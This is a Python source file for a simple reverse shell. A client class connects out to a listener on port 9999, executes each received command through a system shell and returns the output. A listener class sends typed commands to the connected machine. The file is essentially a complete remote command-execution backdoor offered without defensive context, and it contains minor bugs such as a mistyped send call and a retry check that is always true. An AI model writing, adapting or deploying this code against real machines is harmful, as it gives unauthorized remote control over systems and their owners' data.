import socket
import os
import subprocess


class Machine:
    def __init__(self):
        #create socket
        try:
            self.s = socket.socket()
        except socket.error as msg:
            print("Socket creation error: " + str(msg))

    def quit(self):
        self.s.close()


#client is "us"
class Client(Machine):
    def __init__(self, host="127.0.0.1", port=9999):
        super().__init__()
        self.host = host
        self.port = port

    def connect_to_server(self):
        self.s.connect((self.host, self.port))

    def reverse_shell_client(self):
        while True:
            data = self.s.recv(1024)
            if data.decode("utf-8") == "quit":
                print("Client program Shutdown")
                self.s.send(str.encode("Client Program Shutdown"))
                break
            else:
                try:
                    if data[:2].decode("utf-8") == 'cd':
                        os.chdir(data[3:].decode("utf-8"))
                    if len(data) > 0:
                        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        print(cmd)
                        output_bytes = cmd.stdout.read() + cmd.stderr.read()
                        output_str = output_bytes.decode("utf-8", errors='replace')
                        self.s.send(str.encode(output_str + str(os.getcwd()) + "> "))
                        print(output_str)
                except OSError as msg:
                    error_msg = "Error OS : " + str(msg)
                    print(error_msg)
                    self.send(str.encode(error_msg))

    def quit(self):
        pass


#Target is the server
class Target(Machine):

    #initialize host and port server
    def __init__(self, host="", port=9999):
        super().__init__()
        self.host = host
        self.port = port

    #bind de socket with the port
    def socket_bind(self):
        print("Bidding socket to port " + str(self.port))
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
        except socket.error as msg:
            print("Socket binding error: " + str(msg) + "\n" + "Do you want to retry ?")
            if input() == "y" or "yes":
                self.socket_bind()

    #accept the new co
    def socket_accept(self):
        global conn
        conn, address = self.s.accept()
        print("Connexion has been establish | " + "IP " + address[0] + " | Port : " + str(address[1]))

    def reverse_shell(self):
        while True:
            cmd = input()
            if cmd == "quit":
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response)

                self.quit()
                break
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")

    def print_on_both(self, msg):
        conn.send(str.encode(msg))
        print(msg)

    #close de connection and the socket
    def quit(self):
        try:
            conn.close()
            self.print_on_both("connection close")
            super().quit()
            self.print_on_both("socket close")
        except socket.error as msg:
            print("the socket fail to close : " + str(msg))


